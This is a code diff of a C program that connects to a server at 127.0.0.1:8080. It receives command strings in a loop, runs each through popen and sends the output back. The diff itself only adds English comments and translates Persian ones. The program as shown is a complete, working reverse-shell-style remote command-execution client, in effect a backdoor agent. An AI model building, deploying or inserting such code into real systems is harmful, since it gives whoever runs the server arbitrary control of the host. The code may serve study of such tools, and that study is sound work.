@@ -12,17 +12,20 @@
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT 8080
 
+// Error handling function
 void error(const char *msg) {
   perror(msg);
   exit(EXIT_FAILURE);
 }
 
+// Function to execute a command and send the output to the server
 void execute_command(int sock, const char *command) {
+  // If command is invalid or empty, notify the client
   if (!command || strlen(command) == 0) {
     send(sock, "Invalid command\n", 16, 0);
     return;
   }
-
+  // Open a pipe to execute the command
   FILE *fp = popen(command, "r");
   if (!fp) {
     send(sock, "Command failed\n", 15, 0);
@@ -32,8 +35,9 @@ void execute_command(int sock, const char *command) {
   char buffer[BUFFER_SIZE];
   size_t bytes_read;
 
+  // Read the command output and send it to the server
   while ((bytes_read = fread(buffer, 1, sizeof(buffer) - 1, fp)) > 0) {
-    buffer[bytes_read] = '\0'; // اطمینان از پایان یافتن رشته
+    buffer[bytes_read] = '\0'; // Ensure null-terminated string
     if (send(sock, buffer, bytes_read, 0) < 0) {
       perror("send failed");
       break;
@@ -42,7 +46,7 @@ void execute_command(int sock, const char *command) {
 
   pclose(fp);
 
-  // ارسال `END_MARKER`
+  // Send an end marker after the command output
   send(sock, END_MARKER, strlen(END_MARKER), 0);
 }
 
@@ -51,12 +55,15 @@ int main() {
   struct sockaddr_in serv_addr;
   char buffer[BUFFER_SIZE];
 
+  // Create socket for communication
   if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
     error("ERROR opening socket");
 
   memset(&serv_addr, 0, sizeof(serv_addr));
   serv_addr.sin_family = AF_INET;
   serv_addr.sin_port = htons(SERVER_PORT);
+
+  // Convert address to binary form and connect to the server
   if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0)
     error("Invalid address");
 
@@ -68,8 +75,11 @@ int main() {
 
   while (1) {
     memset(buffer, 0, BUFFER_SIZE);
+
+    // Receive the command from the server
     ssize_t bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
 
+    // Handle errors in receiving the command
     if (bytes_received < 0)
       error("ERROR receiving command");
     if (bytes_received == 0) {
@@ -79,15 +89,18 @@ int main() {
 
     buffer[bytes_received] = '\0';
 
+    // If the server sends "exit", terminate the client
     if (strcmp(buffer, "exit") == 0) {
       printf("[!] Received exit command\n");
       break;
     }
 
+    // Print the command and execute it
     printf("[+] Executing: %s\n", buffer);
     execute_command(sock, buffer);
   }
 
+  // Close the socket and exit
   close(sock);
   printf("[+] Connection closed\n");
   return EXIT_SUCCESS;
